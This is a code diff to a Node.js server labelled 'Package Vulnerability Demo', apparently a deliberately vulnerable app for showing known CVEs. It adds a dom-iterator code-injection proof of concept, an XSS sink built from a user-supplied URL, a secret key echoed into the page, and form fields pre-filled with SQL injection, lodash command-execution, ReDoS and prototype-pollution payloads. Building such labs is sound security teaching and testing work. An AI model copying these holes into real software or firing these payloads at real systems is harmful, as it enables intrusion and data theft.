@@ -18,6 +18,33 @@ const server = http.createServer((req, res) => {
       const postData = qs.parse(body);
       let responseMessages = [];
 
+      // CVE-2024-21541: dom-iterator
+      var PUT = require('dom-iterator');
+      global.CTF = function() { console.log("GLOBAL.CTF HIT") } // We want to prove we can execute this by using the package
+
+      var parser = require('mini-html-parser');
+      var html = '<h1></h1>'; // Any non-empty html should work
+      var parser = parser(html);
+      var node = parser.parse();
+      var it = PUT(node);
+      var next;
+      while (next = it.next("constructor.constructor('global.CTF()')()")) { }
+
+      // Vulnerability: Missing SameSite Attribute on Cookies
+      res.setHeader('Set-Cookie', `sessionToken=insecureToken; Path=/; HttpOnly; SameSite=None`);
+      res.setHeader('Content-Type', 'text/html');
+
+      // jQuery Vulnerability: CVE-2015-9251
+      if (postData.jqueryUrl) {
+        const jqueryCode = `<script src="${postData.jqueryUrl}"></script>`;
+        responseMessages.push(`<p>Loading jQuery from user-provided URL:</p><pre>${jqueryCode}</pre>`);
+        res.write(jqueryCode); // This is vulnerable to XSS if untrusted URLs are provided
+      }
+
+      // Placeholder for secret key (potential exposure risk)
+      const SECRET_KEY = process.env.SECRET_KEY || 'PLACEHOLDER_SECRET_KEY';
+      responseMessages.push(`<p>Current Secret Key: ${SECRET_KEY}</p>`);
+
       // Direct SQL Injection via string concatenation
       if (postData.rawSql) {
         try {
@@ -132,7 +159,6 @@ const server = http.createServer((req, res) => {
       }
 
       // Send combined response
-      res.writeHead(200, { 'Content-Type': 'text/html' });
       res.end(responseMessages.join('') + `<p><a href="/">Go back</a></p>`);
     });
   } else if (req.method === 'GET') {
@@ -195,10 +221,13 @@ const server = http.createServer((req, res) => {
         <body>
           <h2>Package Vulnerability Demo</h2>
           <form action="/" method="POST">
+            <!-- 1. Direct SQL Injection -->
             <div>
               <h3>1. Direct SQL Injection</h3>
               <label for="rawSql">SQL Query:</label>
-              <input type="text" id="rawSql" name="rawSql" placeholder="Enter SQL query" style="width: 100%;">
+              <input type="text" id="rawSql" name="rawSql" 
+                     value="SELECT name FROM sqlite_master WHERE type='table';" 
+                     style="width: 100%;">
               <small>Try these payloads:
                 <ul>
                   <li><code>SELECT name FROM sqlite_master WHERE type='table';</code> (List all tables)</li>
@@ -207,10 +236,13 @@ const server = http.createServer((req, res) => {
                 </ul>
               </small>
             </div>
+
+            <!-- 2. Sequelize SQL Injection -->
             <div>
               <h3>2. Sequelize SQL Injection (CVE-2019-10748)</h3>
               <label for="username">Username (for Sequelize Injection):</label>
-              <input type="text" id="username" name="username" placeholder="Enter username">
+              <input type="text" id="username" name="username" 
+                     value='nonexistentuser" OR 1=1 --'>
               <small>Try payloads:
                 <ul>
                   <li><code>nonexistentuser" OR 1=1 --</code></li>
@@ -218,26 +250,43 @@ const server = http.createServer((req, res) => {
                 </ul>
               </small>
             </div>
+
+            <!-- 3. Lodash Template Processing -->
             <div>
               <h3>3. Lodash Template Processing (CVE-2021-23337)</h3>
               <label for="template">Template String:</label>
-              <textarea id="template" name="template" rows="4"></textarea>
+              <textarea id="template" name="template" rows="4">
+        <%= global.process.mainModule.require('child_process').execSync('ls -la') %>
+              </textarea>
               <small>Try payload: <code><%= global.process.mainModule.require('child_process').execSync('ls -la') %></code></small>
             </div>
+
+            <!-- 4. Semver ReDoS Vulnerability -->
             <div>
               <h3>4. Semver ReDoS Vulnerability (CVE-2022-25883)</h3>
               <label for="versionRange">Version Range:</label>
-              <input type="text" id="versionRange" name="versionRange" placeholder="Enter version range">
+              <input type="text" id="versionRange" name="versionRange" 
+                     value="^((((((((((((((((((a)?){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2})*$">
               <small>Try payload: <code>^((((((((((((((((((a)?){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2})*$</code></small>
             </div>
+
+            <!-- 5. JSON5 Prototype Pollution -->
             <div>
               <h3>5. JSON5 Prototype Pollution (CVE-2022-46175)</h3>
               <label for="json5data">JSON5 Data:</label>
-              <textarea id="json5data" name="json5data" rows="4">
-{
-  "__proto__": { "polluted": "Prototype pollution successful!" }
-}
-              </textarea>
+              <textarea id="json5data" name="json5data" rows="4">{
+          "__proto__": { "polluted": "Prototype pollution successful!" }
+        }</textarea>
+              <small>Try payload: <code>{ "__proto__": { "polluted": "Prototype pollution successful!" } }</code></small>
+            </div>
+
+            <!-- 6. jQuery XSS Vulnerability -->
+            <div>
+              <h3>6. jQuery XSS Vulnerability (CVE-2015-9251)</h3>
+              <label for="jqueryUrl">jQuery URL:</label>
+              <input type="text" id="jqueryUrl" name="jqueryUrl" 
+                     value="http://sakurity.com/jqueryxss">
+              <small>Try payload: <code>http://sakurity.com/jqueryxss</code></small>
             </div>
             <input type="submit" value="Submit">
           </form>
